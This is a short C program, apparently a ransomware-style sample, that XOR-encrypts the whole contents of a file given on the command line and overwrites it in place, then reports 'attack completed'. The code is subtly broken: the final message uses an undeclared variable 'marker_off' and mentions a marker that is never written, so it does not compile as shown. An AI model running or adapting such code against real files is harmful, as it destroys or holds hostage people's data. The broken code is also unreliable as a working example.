#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static void die(const char *m){ perror(m); exit(1); }

int main(int argc, char **argv){
    if(argc<2){ fprintf(stderr,"usage: %s <file>\n", argv[0]); return 2; }
    const char *path = argv[1];
    
    int fd = open(path, O_RDWR);
    if(fd<0) die("open");
    
    struct stat st;
    if(fstat(fd,&st)<0) die("fstat");
    if(st.st_size<=0){ fprintf(stderr,"empty file\n"); return 1; }
    
    // read the entire content
    uint8_t *buf = malloc(st.st_size);
    if(!buf) die("malloc");
    ssize_t r = pread(fd, buf, st.st_size, 0);
    if(r != st.st_size) die("pread");
    
    // XOR encrypt everything
    for(off_t i=0; i<st.st_size; i++) 
        buf[i] ^= 0x5A;
    
    // Overwrite with encrypted content starting at offset 0
    if(pwrite(fd, buf, st.st_size, 0) != st.st_size) 
        die("pwrite(encrypted)");
    
    
    if(fsync(fd)!=0) die("fsync");
    close(fd);
    free(buf);
    
    printf("attack completed on %s (XOR encrypted + marker at offset %ld)\n", 
           path, marker_off);
    return 0;
}